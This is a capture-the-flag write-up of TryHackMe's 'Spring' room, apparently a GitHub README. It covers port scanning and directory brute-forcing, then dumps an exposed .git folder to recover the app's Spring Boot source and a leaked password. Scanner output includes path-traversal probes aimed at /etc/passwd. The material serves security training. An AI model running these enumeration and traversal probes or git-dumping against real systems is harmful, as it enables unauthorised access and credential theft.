<h1 align="center"><a href="https://tryhackme.com/room/spring">Spring</a></h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5a76ffb7-81da-49de-97f6-3f6212cbe01a"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2016-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>

<br>
<h2>Task 1 . Introduction</h2>
<p>This machine may take up to 5 minutes to fully deploy.<br>

John created a simple Hello World Web Application, he is still learning.<br>

See if you can find a way to hack him.</p>

<p><em>Answer the questions below</em></p>


<br>
<br>
<h1 align="center">Static Host Mapping<a id='1'></a></h1>

```bash
xx.xx.xxx.xxx spring.thm
```


<br>
<h1 align="center">Port Scanning<a id='2'></a></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                       |
|-------------------:|:---------------------|:----------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3    |
| `80`               |`HTTP`                |Apache Tomcat                      |
| `443`              |`SSL/HTTP`            |Apache Tomcat                      |


</p></div><br>

```bash
:~/Spring$ nmap -sC -sV -Pn -n -p- -T4 spring.thm
...
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
...
80/tcp  open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 302
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Location: https://localhost/
|     Content-Length: 0
|     Date: Fri, 16 Jan 2026 ...
|     Connection: close
|   RTSPRequest, X11Probe:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 16 Jan 2026 ...
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://spring.thm/
443/tcp open  ssl/https
| ssl-cert: Subject: commonName=John Smith/organizationName=spring.thm/stateOrProvinceName=Unknown/countryName=Unknown
| Not valid before: 2020-07-04...
|_Not valid after:  2294-04-18...
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_ssl-date: 2026-01-16...; -1s from scanner time.
```

<br>
<h1 align="center">Directory & File Enumeration<a id='4'></a></h1>

<p>Used <code>ffuf</code> with the following parameters:<br>

- <code>-u</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Target URL<br>
- <code>-w</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'<br>
- <code>-mc</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp;  Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)<br>
- <code>-ic</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Ignore wordlist comments (default: false)<br>
- <code>-c</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Colorize output. (default: false)<br>
- <code>-e</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Comma separated list of extensions. Extends FUZZ keyword.<br>
- <code>-t</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Number of concurrent threads. (default: 40)</p>

```bash
:~/Spring# ffuf -u https://xx.xx.xxx.xxx:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -ic -c -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://xx.xx.xxx.xxx:443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200,301,302
________________________________________________

                        [Status: 200, Size: 13, Words: 2, Lines: 1]
sources                 [Status: 302, Size: 0, Words: 1, Lines: 1]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

<br>
<p>Used <code>dirsearch</code> with the following parameters:<br>

- <code>-u</code> URL or <code>--Url</code>=URL &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Target URL(s), can use multiple flags<br>
- <code>-t</code> THREADS or <code>--threads=</code>THREADS &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Number of threads<br>
- <code>-r</code> or <code>--recursive</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Brute-force recursively<br>
- <code>-R</code> DEPTH or <code>--max-recursion-depyh</code>=DEPTH &nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Maximum recursion depth<br>
- <code>-e</code>EXTENSIONS or <code>--extensions</code>=EXTENSIONS &nbsp;&nbsp; : &nbsp; Extension list separated by commas (e.g. php,asp)</p>

```bash
:~/Spring$ dirsearch -u https://spring.thm/sources/ -t 200 -r -R 5 --exclude-sizes 0B -e php,txt,html,bak,zip,tar,gz,json,js,cgi,aspx
...
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html, bak, zip, tar, gz, json, js, cgi, aspx | HTTP method: GET | Threads: 200 | Wordlist size: 14593
...
Target: https://spring.thm/

[xx:xx:xx] Starting: sources/
[xx:xx:xx] 500 -  455B  - /sources/%2e%2e//google.com
[xx:xx:xx] 400 -  435B  - /sources/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/a%5c.aspx

Task Completed
```

```bash
:~/Spring$ dirsearch -u https://spring.thm/sources/new -t 200 -r -R 5
...

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

...

Target: https://spring.thm/

[xx:xx:xx] Starting: sources/new/
...
[xx:xx:xx] 200 -  148B  - /sources/new/.git/config
[xx:xx:xx] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
[xx:xx:xx] 200 -   73B  - /sources/new/.git/description
[xx:xx:xx] 200 -    1KB - /sources/new/.git/index
[xx:xx:xx] 200 -  240B  - /sources/new/.git/info/exclude
[xx:xx:xx] 200 -  319B  - /sources/new/.git/logs/HEAD
...
[xx:xx:xx] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
...
Added to the queue: sources/new/.git/refs/heads/
...
Added to the queue: sources/new/.git/refs/tags/
[xx:xx:xx] 200 -  355B  - /sources/new/.gitignore
Added to the queue: sources/new/.git/
[xx:xx:xx] 200 -   23B  - /sources/new/.git/HEAD
Added to the queue: sources/new/.git/logs/refs/
[xx:xx:xx] 200 -   41B  - /sources/new/.git/refs/heads/master
Added to the queue: sources/new/.git/logs/refs/heads/
[xx:xx:xx] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/refs/heads/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/heads/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/refs/tags/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/tags/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/a%5c.aspx
[xx:xx:xx] 500 -  455B  - /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
...
Added to the queue: sources/new/.git/info/
...
Added to the queue: sources/new/.git/logs/
...
Added to the queue: sources/new/.git/objects/

[xx:xx:xx] Starting: sources/new/.git/logs/refs/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx]] 400 -  435B  - /sources/new/.git/logs/refs/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/logs/refs/heads/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/refs/heads/a%5c.aspx
[################    ] 84%   9723/11460       109/s       job:6/9  errors:0

[xx:xx:xx] Starting: sources/new/.git/info/
[xx:xx:xx] 500 -  455B  - /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/info/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/logs/
[xx:xx:xx] 500 -  455B  - /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/objects/
[xx:xx:xx] 500 -  455B  - /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
...
Added to the queue: sources/new/.git/objects/06/
...
Added to the queue: sources/new/.git/objects/29/
...
Added to the queue: sources/new/.git/objects/66/
...
Added to the queue: sources/new/.git/objects/69/
...
Added to the queue: sources/new/.git/objects/39/
...
[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd
...
Added to the queue: sources/new/.git/objects/71/
Added to the queue: sources/new/.git/objects/80/
Added to the queue: sources/new/.git/objects/93/
Added to the queue: sources/new/.git/objects/92/
Added to the queue: sources/new/.git/objects/98/
Added to the queue: sources/new/.git/objects/67/
[20:35:19] 400 -  435B  - /sources/new/.git/objects/a%5c.aspx
...
Added to the queue: sources/new/.git/objects/cc/
...
Added to the queue: sources/new/.git/objects/info/

[xx:xx:xx]] Starting: sources/new/.git/objects/06/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/06/a%5c.aspx

[xx:xx:xx] Starting: sources/new/.git/objects/29/
[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd
[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/29/a%5c.aspx
[########            ] 43%   4980/11460       176/s       job:11/22 errors:0
```

<p align="left">
  
- /sources/<br>
- /logout/<br><br>
- /sources/new/.git/config<br>
- /sources/new/.git/COMMIT_EDITMSG<br>
- /sources/new/.git/description<br>
- /sources/new/.git/index<br>
- /sources/new/.git/info/exclude<br>
- /sources/new/.git/logs/HEAD<br>
- /sources/new/.git/logs/refs/heads/master<br>
- /sources/new/.gitignore<br>
- /sources/new/.git/HEAD<br>
- /sources/new/.git/refs/heads/master<br>
- /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/refs/heads/a%5c.aspx<br>
- /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/refs/tags/a%5c.aspx<br>
- /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/a%5c.aspx<br>
- /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
- /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/logs/refs/heads/a%5c.aspx<br>
- /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
- /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/info/a%5c.aspx<br>
- /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
- /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/logs/a%5c.aspx<br>
- /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
- /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/objects/a%5c.aspx<br>
- /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/objects/06/a%5c.aspx<br>
- /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
- /sources/new/.git/objects/29/a%5c.aspx</p>


<br>
<h1 align="center">Git Dump Installation<a id='5'></a></h1>

```bash
$ python3 -m venv venv
```

```bash
$ source venv/bin/activate
```

```bash
(venv) ...:~/Spring$ pip3 install git-dumper
```

<br>
<h1 align="center">Git Dump<a id='6'></a></h1>

```bash
(venv) ...:~/Spring$ git-dumper https://spring.thm/sources/new/.git/ /.../.../Spring/data
```

```bash
(venv) ...:~/Spring/data$ ls -lah
total 48K
drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 xx:xx .
drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 xx:xx ..
drwxr-xr-x 7 cyberlaser cyberlaser 4.0K Jan 15 xx:xx .git
-rw-r--r-- 1 cyberlaser cyberlaser  355 Jan 15 xx:xx .gitignore
-rw-r--r-- 1 cyberlaser cyberlaser 1.2K Jan 15 xx:xx build.gradle
drwxr-xr-x 3 cyberlaser cyberlaser 4.0K Jan 15 xx:xx gradle
-rw-r--r-- 1 cyberlaser cyberlaser 5.4K Jan 15 xx:xx gradlew
-rw-r--r-- 1 cyberlaser cyberlaser 3.0K Jan 15 xx:xx gradlew.bat
-rw-r--r-- 1 cyberlaser cyberlaser   28 Jan 15 xx:xx settings.gradle
-rw-r--r-- 1 cyberlaser cyberlaser   45 Jan 15 xx:xx shell.sh
drwxr-xr-x 4 cyberlaser cyberlaser 4.0K Jan 15 xx:xx src
```

<br>
<br>
<br>


```bash
(venv) ...:~/Spring/sources/new/.git/.git$ ls -lah
total 48K
drwxr-xr-x  7 cyberlaser cyberlaser 4.0K Jan 15 xx:xx .
drwxr-xr-x  5 cyberlaser cyberlaser 4.0K Jan 15 xx:xx ..
-rw-r--r--  1 cyberlaser cyberlaser  401 Jan 15 xx:xx COMMIT_EDITMSG
-rw-r--r--  1 cyberlaser cyberlaser   23 Jan 15 xx:xx HEAD
-rw-r--r--  1 cyberlaser cyberlaser  148 Jan 15 xx:xx config
-rw-r--r--  1 cyberlaser cyberlaser   73 Jan 15 xx:xx description
drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 xx:xx hooks
-rw-r--r--  1 cyberlaser cyberlaser 1.5K Jan 15 xx:xx index
drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 xx:xx info
drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 xx:xx logs
drwxr-xr-x 40 cyberlaser cyberlaser 4.0K Jan 15 xx:xx objects
drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 xx:xx refs
```

```bash
(venv) ...:~/Spring/sources/new/.git/.git$ git log
commit 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6 (HEAD -> master)
Author: John Smith <johnsmith@spring.thm>
Date:   Fri Jul 10 18:13:55 2020 +0000

    added greeting
    changed security password to my usual format

commit 92b433a86a015517f746a3437ba3802be9146722
Author: John Smith <johnsmith@spring.thm>
Date:   Sat Jul 4 23:53:25 2020 +0000

    Hello world
```

<br>
<p>

- spring.security.user.name=johnsmith<br>
- spring.security.user.password=idontwannag0<br>
- spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>

```bash
(venv) ...:~/Spring/sources/new/.git/.git$ git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
diff --git a/src/main/java/com/onurshin/spring/Application.java b/src/main/java/com/onurshin/spring/Application.java
index fee60ff..e49a401 100644
--- a/src/main/java/com/onurshin/spring/Application.java
+++ b/src/main/java/com/onurshin/spring/Application.java
@@ -18,6 +18,7 @@ import org.springframework.security.config.annotation.web.builders.HttpSecurity;
 import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
 import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;

 @SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})
@@ -28,10 +29,12 @@ public class Application {
     }

     @RestController
+    //https://spring.io/guides/gs/rest-service/
     static class HelloWorldController {
         @RequestMapping("/")
-        public String hello() {
-            return "Hello WORLD";
+        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
+            System.out.println(name);
+            return String.format("Hello, %s!", name);
         }
     }

@@ -57,8 +60,6 @@ public class Application {
                 securityConstraint.addCollection(collection);
                 context.addConstraint(securityConstraint);
                 context.setUseHttpOnly(true);
-
-                System.out.println(context.findChild("default"));
             }

             @Override
diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
index ccf5992..71e1811 100644
--- a/src/main/resources/application.properties
+++ b/src/main/resources/application.properties
@@ -12,7 +12,7 @@ spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.
 server.servlet.register-default-servlet=true
 spring.mvc.ignore-default-model-on-redirect=true
 spring.security.user.name=johnsmith
-spring.security.user.password=idontwannag0
+spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦
 debug=false
 spring.cloud.config.uri=
 spring.cloud.config.allow-override=true
```

```bash
(venv) ...:~/Spring/sources/new/.git$ git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
HEAD is now at 1a83ec3 added greeting changed security password to my usual format
```

```bash
(venv) ...:~/Spring/sources/new/.git$ find -ls | grep -v \\.git
   217813      4 drwxr-xr-x   5 cyberlaser cyberlaser     4096 Jan 15 xx:xx .
   219009      4 -rw-r--r--   1 cyberlaser cyberlaser       28 Jan 15 xx:xx ./settings.gradle
   219008      4 -rw-r--r--   1 cyberlaser cyberlaser     3058 Jan 15 xx:xx ./gradlew.bat
   219003      4 -rw-r--r--   1 cyberlaser cyberlaser     1151 Jan 15 xx:xx ./build.gradle
   219010      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src
   219022      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test
   219023      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java
   219024      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java/com
   219025      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java/com/onurshin
   219026      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java/com/onurshin/spring
   219027      4 -rw-r--r--   1 cyberlaser cyberlaser      214 Jan 15 xx:xx ./src/test/java/com/onurshin/spring/ApplicationTests.java
   219011      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main
   219012      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java
   219015      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/com
   219016      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/com/onurshin
   219017      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/com/onurshin/spring
   219018      8 -rw-r--r--   1 cyberlaser cyberlaser     4350 Jan 15 xx:xx ./src/main/java/com/onurshin/spring/Application.java
   219013      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/META-INF
   219014      4 -rw-r--r--   1 cyberlaser cyberlaser       70 Jan 15 xx:xx ./src/main/java/META-INF/MANIFEST.MF
   219019      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/resources
   219020      4 -rw-r--r--   1 cyberlaser cyberlaser     1007 Jan 15 xx:xx ./src/main/resources/application.properties
   219021      4 -rw-r--r--   1 cyberlaser cyberlaser     2581 Jan 15 xx:xx ./src/main/resources/dummycert.p12
   219007      8 -rw-r--r--   1 cyberlaser cyberlaser     5441 Jan 15 xx:xx ./gradlew
   219004      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./gradle
   219005      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./gradle/wrapper
   219006      4 -rw-r--r--   1 cyberlaser cyberlaser      238 Jan 15 xx:xx ./gradle/wrapper/gradle-wrapper.properties
```

```bash
(venv) ...:~/Spring/sources/new/.git$ cat build.gradle
plugins {
    id 'org.springframework.boot' version '2.3.1.RELEASE'
    id 'io.spring.dependency-management' version '1.0.9.RELEASE'
    id 'java'
}

group = 'com.onurshin'
version = '0.0.1-SNAPSHOT'
sourceCompatibility = '1.8'

repositories {
    mavenCentral()
}

ext {
    set('springCloudVersion', "Greenwich.SR4")
}
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-actuator'
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'

    implementation 'org.springframework.cloud:spring-cloud-starter-config'
    runtimeOnly 'com.h2database:h2'

    testImplementation('org.springframework.boot:spring-boot-starter-test') {
        exclude group: 'org.junit.vintage', module: 'junit-vintage-engine'
    }
    testImplementation 'org.springframework.security:spring-security-test'
}

dependencyManagement {
    imports {
        mavenBom "org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}"
    }
}
test {
    useJUnitPlatform()
}
(venv) cyberlaser@DESKTOP-0AHBUE8:~/Spring/sources/new/.git$
```

<br><p align="center">Application.java</p>

```bash
(venv) ...:~/Spring/sources/new/.git/src/main/java/com/onurshin/spring$ cat Application.java
package com.onurshin.spring;

import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.startup.Tomcat;
import org.apache.tomcat.util.descriptor.web.SecurityCollection;
import org.apache.tomcat.util.descriptor.web.SecurityConstraint;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.embedded.tomcat.TomcatWebServer;
import org.springframework.boot.web.servlet.server.ServletWebServerFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }


    private Connector redirectConnector() {
        Connector connector = new Connector("org.apache.coyote.http11.Http11NioProtocol");
        connector.setScheme("http");
        connector.setPort(80);
        connector.setSecure(false);
        connector.setRedirectPort(443);
        return connector;
    }

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
                context.setUseHttpOnly(true);
            }

            @Override
            protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {
                Context context = tomcat.addContext("/sources", "/opt/spring/sources/");
                context.setParentClassLoader(getClass().getClassLoader());
                context.setUseHttpOnly(true);

                Wrapper defaultServlet = context.createWrapper();
                defaultServlet.setName("default");
                defaultServlet.setServletClass("org.apache.catalina.servlets.DefaultServlet");
                defaultServlet.addInitParameter("debug", "0");
                defaultServlet.addInitParameter("listings", "false");
                defaultServlet.setLoadOnStartup(1);
                defaultServlet.setOverridable(true);
                context.addChild(defaultServlet);
                context.addServletMappingDecoded("/", "default");

                return super.getTomcatWebServer(tomcat);
            }
        };
        factory.addAdditionalTomcatConnectors(redirectConnector());
        return factory;
    }

    @Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
}
```
<p>
  
- server.port= 443<br>
